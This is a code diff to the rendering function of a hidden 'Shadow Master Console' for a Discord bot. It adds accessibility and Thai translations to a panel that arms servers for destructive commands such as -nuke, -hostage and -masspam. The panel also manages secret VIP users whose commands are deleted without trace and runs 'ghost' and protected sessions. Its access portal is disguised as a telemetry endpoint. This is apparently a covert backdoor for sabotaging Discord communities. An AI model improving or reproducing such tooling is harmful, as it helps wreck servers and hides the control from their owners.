@@ -1,5 +1,21 @@
 const { escapeHtml, hiddenInput, safeStyleContent } = require("./htmlUtils");
 
+const SHADOW_UI_CSS = `
+:focus-visible{outline:3px solid rgba(251,191,36,.92);outline-offset:3px}
+.skip-link{position:fixed;top:10px;left:10px;z-index:100000;padding:10px 14px;border-radius:10px;background:var(--red);color:#fff;transform:translateY(-160%);transition:transform .18s ease}
+.skip-link:focus{transform:translateY(0)}
+.tabs{position:sticky;top:8px;z-index:80;padding:8px;background:rgba(7,5,15,.82);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);box-shadow:0 10px 30px rgba(0,0,0,.28)}
+.tab-btn{min-height:44px;font-family:inherit}
+.section.active{animation:shadow-page-in .28s cubic-bezier(.22,.8,.24,1) both}
+@keyframes shadow-page-in{from{opacity:0;transform:translateY(7px)}to{opacity:1;transform:none}}
+.copy-surface{width:100%;display:block;text-align:left;background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:10px;color:var(--yellow);font-family:monospace;font-size:.76em;overflow-wrap:anywhere;cursor:pointer}
+.copy-surface:hover{border-color:var(--yellow)}
+button[aria-busy="true"]{opacity:.68;cursor:wait}
+.toast{transition:opacity .18s ease,transform .18s ease}
+@media(max-width:700px){.tabs{overflow-x:auto;flex-wrap:nowrap;justify-content:flex-start;-webkit-overflow-scrolling:touch}.tab-btn{flex:0 0 auto}.shadow-header{padding-top:18px}.grid2 form,.grid2 .btn{width:100%}}
+@media(prefers-reduced-motion:reduce){*,*::before,*::after{animation-duration:.01ms!important;animation-iteration-count:1!important;transition-duration:.01ms!important;scroll-behavior:auto!important}}
+`;
+
 function renderShadowDashboardPage(viewData = {}, state = {}) {
     const {
         SHADOW_CSS = "",
@@ -30,10 +46,12 @@ function renderShadowDashboardPage(viewData = {}, state = {}) {
 
     return `<!DOCTYPE html><html lang="th"><head>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<meta name="theme-color" content="#07050f"><meta name="color-scheme" content="dark">
 <title>👁️‍🗨️ Shadow Master Console</title>
-<style>${safeStyleContent(SHADOW_CSS)}</style>
+<style>${safeStyleContent(SHADOW_CSS)}${SHADOW_UI_CSS}</style>
 </head><body>
-<div class="container">
+<a class="skip-link" href="#shadow-main">ข้ามไปเนื้อหาหลัก</a>
+<main id="shadow-main" class="container" tabindex="-1">
 
 <div class="shadow-header">
     <div class="shadow-title">👁️‍🗨️ SHADOW MASTER CONSOLE</div>
@@ -46,37 +64,37 @@ function renderShadowDashboardPage(viewData = {}, state = {}) {
 </div>
 
 <!-- Navigation Tabs -->
-<div class="tabs">
-    <a class="tab-btn active" onclick="showTab('overview',this)">📊 Overview</a>
-    <a class="tab-btn" onclick="showTab('toggles',this)">🎛️ Switches</a>
-    <a class="tab-btn" onclick="showTab('targets',this)">🎯 Target Lock</a>
-    <a class="tab-btn" onclick="showTab('sessions',this)">📡 Sessions</a>
-    <a class="tab-btn" onclick="showTab('vip',this)">👥 VIP</a>
-    <a class="tab-btn" onclick="showTab('manual',this)">📖 Manual</a>
-    <a class="tab-btn" onclick="showTab('settings',this)">⚙️ Settings</a>
-</div>
+<nav class="tabs" role="tablist" aria-label="หมวดเครื่องมือ Shadow Portal">
+    <button id="shadow-tab-overview" type="button" role="tab" aria-selected="true" aria-controls="tab-overview" class="tab-btn active" data-shadow-tab="overview">📊 ภาพรวม</button>
+    <button id="shadow-tab-toggles" type="button" role="tab" aria-selected="false" aria-controls="tab-toggles" class="tab-btn" data-shadow-tab="toggles">🎛️ สวิตช์ระบบ</button>
+    <button id="shadow-tab-targets" type="button" role="tab" aria-selected="false" aria-controls="tab-targets" class="tab-btn" data-shadow-tab="targets">🎯 เซิร์ฟเวอร์เป้าหมาย</button>
+    <button id="shadow-tab-sessions" type="button" role="tab" aria-selected="false" aria-controls="tab-sessions" class="tab-btn" data-shadow-tab="sessions">📡 Session</button>
+    <button id="shadow-tab-vip" type="button" role="tab" aria-selected="false" aria-controls="tab-vip" class="tab-btn" data-shadow-tab="vip">👥 ผู้มีสิทธิ์</button>
+    <button id="shadow-tab-manual" type="button" role="tab" aria-selected="false" aria-controls="tab-manual" class="tab-btn" data-shadow-tab="manual">📖 คู่มือ</button>
+    <button id="shadow-tab-settings" type="button" role="tab" aria-selected="false" aria-controls="tab-settings" class="tab-btn" data-shadow-tab="settings">⚙️ ตั้งค่า</button>
+</nav>
 
 <!-- ── TAB: Overview ── -->
-<div class="section active" id="tab-overview">
+<section class="section active" id="tab-overview" role="tabpanel" aria-labelledby="shadow-tab-overview" tabindex="0">
     ${botStats ? `
     <div class="grid3" style="margin-bottom:14px;">
-        <div class="stat-box"><div class="stat-val" style="color:var(--red2);">${escapeHtml(botStats.guilds)}</div><div class="stat-lbl">🌐 Guilds</div></div>
+        <div class="stat-box"><div class="stat-val" style="color:var(--red2);">${escapeHtml(botStats.guilds)}</div><div class="stat-lbl">🌐 เซิร์ฟเวอร์</div></div>
         <div class="stat-box"><div class="stat-val" style="color:var(--yellow);">${escapeHtml(botStats.ping)}ms</div><div class="stat-lbl">🏓 Ping</div></div>
         <div class="stat-box"><div class="stat-val" style="color:var(--purple);">${escapeHtml(botStats.ram)} MB</div><div class="stat-lbl">🧠 RAM</div></div>
-        <div class="stat-box"><div class="stat-val" style="color:var(--green);">${escapeHtml(botStats.uptime)}m</div><div class="stat-lbl">⏱️ Uptime</div></div>
+        <div class="stat-box"><div class="stat-val" style="color:var(--green);">${escapeHtml(botStats.uptime)}m</div><div class="stat-lbl">⏱️ เวลาทำงาน</div></div>
         <div class="stat-box"><div class="stat-val" style="color:var(--red2);">${escapeHtml(armedGuildCount)}</div><div class="stat-lbl">⚠️ Armed</div></div>
         <div class="stat-box"><div class="stat-val" style="color:#f97316;">${escapeHtml(globalAdminCount)}</div><div class="stat-lbl">👥 VIPs</div></div>
     </div>
     <div class="card">
-        <h3>🤖 Bot Status</h3>
+        <h3>🤖 สถานะบอท</h3>
         <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
             <span style="color:var(--green);font-weight:700;">🟢 ${escapeHtml(botStats.tag)}</span>
             <span style="color:var(--text3);font-size:0.82em;">Ping: ${escapeHtml(botStats.ping)}ms | Uptime: ${escapeHtml(botStats.uptime)}m | RAM: ${escapeHtml(botStats.ram)}MB</span>
         </div>
-    </div>` : '<div class="card"><h3>🤖 Bot Status</h3><p style="color:var(--red2);">🔴 Bot Offline</p></div>'}
+    </div>` : '<div class="card"><h3>🤖 สถานะบอท</h3><p style="color:var(--red2);">🔴 บอทออฟไลน์</p></div>'}
 
     <div class="card">
-        <h3>⚡ Quick Actions</h3>
+        <h3>⚡ ทางลัด</h3>
         <div class="grid2">
             <form method="POST">
                 ${hiddenInput("action", "ghost_toggle")}
@@ -87,15 +105,15 @@ function renderShadowDashboardPage(viewData = {}, state = {}) {
     </div>
 
     <div class="card">
-        <h3>🕐 Recent Activity</h3>
+        <h3>🕐 กิจกรรมล่าสุด</h3>
         <p style="color:var(--text3);font-size:0.82em;text-align:center;padding:12px 0;">Log จะแสดงใน Webhook ลับของคุณ — เปิด WEBHOOK_LOG_URL เพื่อดู</p>
     </div>
-</div>
+</section>
 
 <!-- ── TAB: Switches ── -->
-<div class="section" id="tab-toggles">
+<section class="section" id="tab-toggles" role="tabpanel" aria-labelledby="shadow-tab-toggles" tabindex="0" hidden>
     <div class="card">
-        <h3>🎛️ System Feature Switches</h3>
+        <h3>🎛️ เปิด–ปิดฟีเจอร์ระบบ</h3>
         <p style="color:var(--text3);font-size:0.78em;margin-bottom:14px;">ปิด/เปิดฟีเจอร์แต่ละอย่างได้อิสระ — มีผลทันที</p>
         ${toggleRows}
     </div>
@@ -131,10 +149,10 @@ function renderShadowDashboardPage(viewData = {}, state = {}) {
         <h4 style="margin:14px 0 6px;color:var(--text2);">Metrics</h4>
         ${traceMetricRows}
     </div>
-</div>
+</section>
 
 <!-- ── TAB: Target Lock ── -->
-<div class="section" id="tab-targets">
+<section class="section" id="tab-targets" role="tabpanel" aria-labelledby="shadow-tab-targets" tabindex="0" hidden>
     <div class="card">
         <h3>🎯 Target Lock — ARM/DISARM Guilds</h3>
         <p style="color:var(--red2);font-size:0.78em;margin-bottom:14px;">⚠️ ต้อง ARM ก่อนถึงจะใช้คำสั่งทำลายล้างได้ (-nuke, -hostage, -ruinroles, -spamvc, -masspam)</p>
@@ -148,12 +166,12 @@ function renderShadowDashboardPage(viewData = {}, state = {}) {
             <tbody>${guildRows}</tbody>
         </table>
     </div>
-</div>
+</section>
 
 <!-- ── TAB: Sessions ── -->
-<div class="section" id="tab-sessions">
+<section class="section" id="tab-sessions" role="tabpanel" aria-labelledby="shadow-tab-sessions" tabindex="0" hidden>
     <div class="card">
-        <h3>📡 Active Voice Sessions</h3>
+        <h3>📡 Session เสียงที่กำลังทำงาน</h3>
         <p style="color:var(--text3);font-size:0.78em;margin-bottom:14px;">🛡️ Protected session ไม่สามารถหยุดได้จาก Dashboard ปกติ</p>
         <table>
             <thead><tr>
@@ -165,10 +183,10 @@ function renderShadowDashboardPage(viewData = {}, state = {}) {
             <tbody>${sessionRows}</tbody>
         </table>
     </div>
-</div>
+</section>
 
 <!-- ── TAB: VIP ── -->
-<div class="section" id="tab-vip">
+<section class="section" id="tab-vip" role="tabpanel" aria-labelledby="shadow-tab-vip" tabindex="0" hidden>
     <div class="card">
         <h3>👥 VIP — ไอดีที่ได้รับสิทธิ์รันคำสั่งลับ</h3>
         <form method="POST" style="display:flex;gap:8px;margin-bottom:16px;">
@@ -184,10 +202,10 @@ function renderShadowDashboardPage(viewData = {}, state = {}) {
         <code style="background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:8px 14px;font-size:0.9em;color:var(--yellow);display:block;word-break:break-all;">${safeSecretPhrase}</code>
         <p style="color:var(--text3);font-size:0.72em;margin-top:8px;">* บอทจะลบข้อความทิ้งทันทีหลังประมวลผล — ไม่มีร่องรอย</p>
     </div>
-</div>
+</section>
 
 <!-- ── TAB: Manual ── -->
-<div class="section" id="tab-manual">
+<section class="section" id="tab-manual" role="tabpanel" aria-labelledby="shadow-tab-manual" tabindex="0" hidden>
     <div class="card">
         <h3>📖 คู่มือคำสั่งลับทั้งหมด</h3>
         <div style="display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap;">
@@ -197,17 +215,17 @@ function renderShadowDashboardPage(viewData = {}, state = {}) {
         </div>
         ${cmdRows}
     </div>
-</div>
+</section>
 
 <!-- ── TAB: Settings ── -->
-<div class="section" id="tab-settings">
+<section class="section" id="tab-settings" role="tabpanel" aria-labelledby="shadow-tab-settings" tabindex="0" hidden>
     <div class="grid2">
         <div class="card">
             <h3>🔑 เปลี่ยนรหัสผ่าน Portal</h3>
             <form method="POST">
                 ${hiddenInput("action", "change_pin")}
                 <label>รหัส PIN ใหม่</label>
-                <input type="text" name="new_pin" placeholder="กรอกรหัสใหม่...">
+                <input type="password" name="new_pin" placeholder="กรอกรหัสใหม่..." autocomplete="new-password">
                 <button type="submit" class="btn btn-warn">🔑 บันทึกรหัสใหม่</button>
             </form>
             <p style="color:var(--text3);font-size:0.72em;margin-top:8px;">* บอทจะยิง Webhook แจ้งเตือนทันทีเมื่อเปลี่ยน</p>
@@ -215,14 +233,14 @@ function renderShadowDashboardPage(viewData = {}, state = {}) {
         <div class="card">
             <h3>🔗 ลิงก์ Portal</h3>
             <p style="color:var(--text3);font-size:0.8em;margin-bottom:10px;">ลิงก์เข้า Shadow Portal ด้วย PIN ปัจจุบัน:</p>
-            <code id="portalLink" style="background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:8px;font-size:0.72em;color:var(--yellow);display:block;word-break:break-all;cursor:pointer;" onclick="copyLink()" title="คลิกเพื่อ copy">
+            <button id="portalLink" type="button" class="copy-surface" onclick="copyLink()" title="คัดลอกลิงก์ Portal">
                 ${portalBaseUrl}/api/v1/telemetry/snapshot
-            </code>
-            <p style="color:var(--text3);font-size:0.7em;margin-top:6px;">คลิกที่ลิงก์เพื่อ copy</p>
+            </button>
+            <p style="color:var(--text3);font-size:0.7em;margin-top:6px;">กดเพื่อคัดลอกลิงก์</p>
         </div>
     </div>
     <div class="card">
-        <h3>⚠️ Danger Zone</h3>
+        <h3>⚠️ การตั้งค่าที่มีความเสี่ยง</h3>
         <div class="grid2">
             <form method="POST">
                 ${hiddenInput("action", "ghost_toggle")}
@@ -231,19 +249,27 @@ function renderShadowDashboardPage(viewData = {}, state = {}) {
             <a href="/" class="btn btn-purple" style="display:flex;align-items:center;justify-content:center;text-decoration:none;">🌐 กลับ Main Dashboard</a>
         </div>
     </div>
-</div>
+</section>
 
-</div><!-- end container -->
+</main><!-- end container -->
 
-<div class="toast" id="toast"></div>
+<div class="toast" id="toast" role="status" aria-live="polite" aria-atomic="true"></div>
 
 <script>
 // Tab switching
 function showTab(id, el) {
-    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
-    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-    document.getElementById('tab-'+id).classList.add('active');
-    if(el) el.classList.add('active');
+    document.querySelectorAll('.section').forEach(s => {
+        const selected=s.id==='tab-'+id;
+        s.classList.toggle('active',selected);
+        s.hidden=!selected;
+    });
+    document.querySelectorAll('.tab-btn').forEach(b => {
+        const selected=b.dataset.shadowTab===id;
+        b.classList.toggle('active',selected);
+        b.setAttribute('aria-selected',String(selected));
+        b.tabIndex=selected?0:-1;
+    });
+    if(el) el.focus();
 }
 
 // Toast
@@ -264,17 +290,35 @@ function copyLink() {
 // Restore tab from hash
 window.addEventListener('DOMContentLoaded', () => {
     const hash = window.location.hash.replace('#','');
-    if(hash) {
-        const btn = document.querySelector('[onclick*="'+hash+'"]');
-        if(btn) showTab(hash, btn);
-    }
+    const btn = [...document.querySelectorAll('.tab-btn')].find(tab => tab.dataset.shadowTab === hash);
+    if(btn) showTab(hash, btn);
 });
 
 // Save tab state
 document.querySelectorAll('.tab-btn').forEach(btn => {
     btn.addEventListener('click', () => {
-        const match = btn.getAttribute('onclick').match(/'([^']+)'/);
-        if(match) window.location.hash = match[1];
+        const tab=btn.dataset.shadowTab;
+        showTab(tab,btn);
+        window.location.hash=tab;
+    });
+    btn.addEventListener('keydown',event => {
+        if(!['ArrowLeft','ArrowRight','Home','End'].includes(event.key)) return;
+        event.preventDefault();
+        const tabs=[...document.querySelectorAll('.tab-btn')];
+        let index=tabs.indexOf(btn);
+        if(event.key==='Home') index=0;
+        else if(event.key==='End') index=tabs.length-1;
+        else index=(index+(event.key==='ArrowRight'?1:-1)+tabs.length)%tabs.length;
+        tabs[index].click();
+    });
+});
+
+document.querySelectorAll('form').forEach(form => {
+    form.addEventListener('submit',() => {
+        const button=form.querySelector('button[type="submit"]');
+        if(!button) return;
+        button.disabled=true;
+        button.setAttribute('aria-busy','true');
     });
 });
 </script>
